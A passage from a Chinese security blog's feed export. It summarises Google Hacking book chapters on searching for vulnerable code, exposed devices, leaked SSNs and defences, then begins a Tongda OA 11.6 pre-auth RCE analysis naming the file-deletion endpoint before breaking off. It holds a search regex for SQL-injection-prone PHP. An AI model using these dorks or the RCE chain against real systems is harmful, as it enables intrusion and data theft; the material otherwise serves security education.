<li><p>尽管这样，攻击者扔旧可以寄存恶意脚本，该脚本可以利用带有漏洞的浏览器，允许系统控制访问者的浏览器。这正是我们着手查看Google Code开发平台真正潜力的入口。没有任何东西可以防止攻击者在线寄存他们的恶意文件，防止攻击者使用它们来攻击无辜的人。因为ISP（互联网服务提供商）不能完全地组织Google来停止恶意传播，所以这种情况很值得关注。很多用户的处境都不容乐观</p>
<ul>
<li>哪些熟悉IDS（侵入检测系统）和IPS（侵入预防系统）的人之所以会反对是因为恶意软件也可以通过将签名设置为可以在流行防火墙产品以及诸如Snort之类的开发源项目中找到的签名来查找。因为Google Code的加密选项，在绝大多数时间，攻击者都不会被察觉。正如我们知道的，加密通信能确保隐私的安全。Google为寄存的项目提供了SSL连接</li>
</ul>
<p><strong>10.6.3 查找代码</strong></p>
</li>
<li><p>我们还可以用Google Code来查询代码，用一些正则表达式来精确的搜索一些我们想要的阿东西</p>
<ul>
<li>例如查找SQL注入漏洞：</li>
</ul>
<p>mysql_query.*?_GET lang:php</p>
<ul>
<li>该查询以关键字mysql_query开头——mysql_query是PHP里的标准函数。接着，我们使用.*?序列查找未定义的字符数。最后，在查找HTTP GET参数的关键字_GET。通常，我们查找的SQL查询由$_GET控制。对基于$_POST的SQL注入攻击应用也可以采用相似的策略。记住，本章的实例仅是我们可以进行测试的实例的一小部分变体。Google Code Search是一个非常有用的可以在很多语种中查找漏洞的工具</li>
</ul>
<p><strong>10.7 一些想法</strong></p>
</li>
<li><p>我们可以使用Google Code Search在我们自己的项目中查找字符串。如果我们有一个巨大的数据集要分析，我们可以简单地将它上传到代码中，并且等待Google机器人程序将它找出来。接着，我们可以使用标准的正则表达式查询来查找我们最感兴趣的数据</p>
<ul>
<li>对于一些工具我们可以根据他的源码和一些反应来自己创立一个属于自己的工具来做一些自己想做的事情</li>
</ul>
<p><strong>第十一章 Google Hacking案例</strong></p>
<p><strong>11.1 简介</strong></p>
<ul>
<li>Google 黑客会花上好几个小时在互联网上查找丰富的资源。通过一轮又一轮的搜索，他们会因找到清晰易读的，有意义的的搜索而欣喜若狂。之所以我了解这些是因为我亲眼目睹了这一过程。具有创造力的Google搜索可以泄露医药、金融、所有权甚至是机密信息。尽管政府颁布了法令、规章及保护法案，诸如HIPPA，且不断设置安全装置，这一问题仍然存在。信息仍会驱使网络中这一问题的发生，而这正好被Google黑客逮个正着</li>
</ul>
<p><strong>11.2 低级信息</strong></p>
<ul>
<li>我们将要一同来看一下由Google黑客揭秘的一些更有趣的技术。我们将从查看多种确实无关的、除非你的目标是帮助黑客的工具着手进行。接着，我们将要查看开放的网络设备，并且打开应用程序，它们都不涉及任何真正的可以使用的攻击</li>
</ul>
<p><strong>11.2.1 工具</strong></p>
</li>
<li><p>任何黑客都有一个由他自行支配的工具基金，但是本节奏要探讨的该工具的有趣部分是：它们是在线的——它们在网络服务器上运行，且允许黑客有效地试探对该网络服务器的搜索。</p>
<ul>
<li>与ping工具不同，finger工具已经很久没有投入使用了。这一烦人的服务允许攻击者查询UNIX机器上的用户，允许枚举各种信息，如用户连接时间、起始目录、全名以及其他的信息</li>
</ul>
<p><strong>11.2.2 开放的网络设备</strong></p>
</li>
<li><p>对于所有在网络上开放和管理的网络设备你都可以去了解和控制</p>
<ul>
<li>例如比较多的像摄像头，饮水机，打印机，自能手表等多种设备</li>
</ul>
<p><strong>11.2.3 开放的应用程序</strong></p>
</li>
<li><p>相对而言，很多主流的Web应用程序都是傻子认证，它们是专门为那些对安全了解甚少而只懂点击操作的大部分人设计的。更重要的是Google攻击社区已经发现了成千上万个开放的在线应用程序，只需等待一个点击操作的脚本的出现并拥有它们即可</p>
<ul>
<li>通常可以简单的去发现和控制一些网站甚至是一些服务器</li>
</ul>
<p><strong>11.3 摄像头</strong></p>
<ul>
<li>曾有一段时间，GHDB的所有附件就只有网络摄像头查询。尽管如此，有些网络摄像头查询。尽管如此，有些网络摄像头搜索还是十分有趣的。</li>
</ul>
<p><strong>11.4 电话设备</strong></p>
</li>
<li><p>有些网络设备映射的网络暴露的大量的电话信息</p>
<ul>
<li>有的管理系统甚至语序网络访问这连接会议电话、断开会议电话连接及监控会议电话，为与会者抓取快照，甚至是更改line(线路设置)，恶意的黑客甚至会更改系统名和密码，锁定合法管理者使其无法进入自己的系统</li>
</ul>
<p><strong>11.5 电源</strong></p>
<ul>
<li>当谈及使用Google攻击电源时，很多人都会感到怀疑。大多数人肯定在想是说UPS系统，对于网络上的一些有网络管理页面的系统来说都可以解决掉</li>
</ul>
<p><strong>11.6 敏感信息</strong></p>
<ul>
<li>敏感信息对于一些日志，文档，警务信息等都会泄露出大量的信息</li>
</ul>
<p><strong>11.7 社保号码</strong></p>
</li>
<li><p>社保号码（SSN）是美国公民拥有的最敏感的信息。即使一个外行的罪犯也可以使用一个被到的SSN来开设一个银行账号，设置信用卡的最高限额以及其他的信息，所有均是以受害人的名义进行的。</p>
<ul>
<li>对于一些Google泄露的信息来说大部分是攻击者从钓鱼网站上得来的</li>
</ul>
<p><strong>11.8 Google之外的信息</strong></p>
<ul>
<li>在某些情况下，Google都是长长的攻击链中的第一步。通过别的一些信息来获取到一些敏感的信息</li>
</ul>
<p><strong>11.9 总结</strong></p>
<ul>
<li>本章的所有内容都是关于Google攻击威胁被忽略后可能导致的严重错误。不论你何时身处严重的威胁都可以参看本章内容。请帮助传播这一信息，并且成为解决方案的一本而非问题的一本分。在想Google发送暂停或终止文件之前，记住——如果你的敏感数据使它成为在线内容，那么就不是Google的错了</li>
</ul>
<p><strong>第十二章 防卫Google黑客</strong></p>
<p><strong>12.1 简介</strong></p>
<ul>
<li>这本书的目的是在于帮助你理解Google黑客在攻击时可能采取的手段，这样你就能合理地保护自己和你的客户免于遭受这种似乎没有危险的威胁的侵害</li>
</ul>
<p><strong>12.2 完善且坚固的安全策略</strong></p>
</li>
<li><p>应该把强制执行的，坚固的安全策略作为所有安全保障措施的基础</p>
<ul>
<li>如果没有策略，那么你的安全防卫可能就会无效或者无法强制执行</li>
</ul>
<p><strong>12.3 Web服务器安全防护</strong></p>
<ul>
<li>目录列表、错误消息和不当的配置能提供大量信息</li>
<li>Robots.txt文件和特殊的META标记可以阻止搜索引擎Crawler访问特定的页面或目录</li>
</ul>
</li>
<li><p>即使时最基本的口令机制都能阻止crawler访问受保护的内容</p>
<ul>
<li>默认的页面和设置表明该服务器没有很好地维护而且会让该服务器成为黑客的一个目标</li>
</ul>
<p><strong>12.4 攻击你的站点</strong></p>
<ul>
<li>使用site操作符来浏览你负责保护的服务器，警惕任何不属于公开信息的页面</li>
<li>使用想Gooscan、Athena、GSI、Google Rower或者Advanced Dork这样的工具来评估你的网站的信息泄露情况。这些工具不使用Google API，所以要知道任何滥用或者过分的行为都会导致Google封掉你的IP段</li>
</ul>
</li>
<li><p>使用像Wikto这样的工具也能攻击你的站点，而且这些工具使用了Google API，不会担心会被Google惩罚</p>
<ul>
<li>利用Google hacking DATabase来跟踪最新的Google hacking查询。把GHDB和Gooscan、Athena或者Wikto这样的工具结合起来使用</li>
</ul>
<p><strong>12.5 从Google获取帮助</strong></p>
</li>
<li><p>使用Google的Webmaster页面获取特殊的信息</p>
<ul>
<li>使用Google的URL删除工具从Google数据库中删除敏感的数据</li>
</ul>
<p><strong>12.6 网站链接</strong></p>
<ul>
<li><a href="http://johnny.ihackstuff.com">http://johnny.ihackstuff.com</a> （GHDB），搜索引擎hacking论坛，Gooscan工具和GHDB导出文件的主页</li>
<li><a href="http://www.snakeoillabs.com">www.snakeoillabs.com</a>    Athena的主页</li>
<li><a href="http://www.seorank.com/robots-tutorial.htm">http://www.seorank.com/robots-tutorial.htm</a>    使用robots.txt文件的优秀指南</li>
<li><a href="http://www.sensepost.com/research/aura">www.sensepost.com/research/aura</a>          Sensepost的AURA,它可以模拟Google的SOAP API调用</li>
<li><a href="http://www.tankedgenius.com">http://www.tankedgenius.com</a>        JeffBall的Cp的GSI以及Google Rower工具的主页</li>
<li><a href="https://addons.mozilla.org/en-US/firfox/addon/2144">https://addons.mozilla.org/en-US/firfox/addon/2144</a>    Cp的Advanced Dork的主页</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Google-Hacking</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA11.6 preAuth RCE分析</title>
    <url>/2020/09/13/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA11-6-preAuth-RCE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>该漏洞需要结合任意文件删除以及文件上传漏洞进行配合</p>
<a id="more"></a>

<h1 id="任意文件删除漏洞"><a href="#任意文件删除漏洞" class="headerlink" title="任意文件删除漏洞"></a>任意文件删除漏洞</h1><p>首先漏洞是在/module/appbuilder/assets/print.php</p>
<h3 id="img"><a href="#img" class="headerlink" title="img"></a><a href="data:image/png;base64,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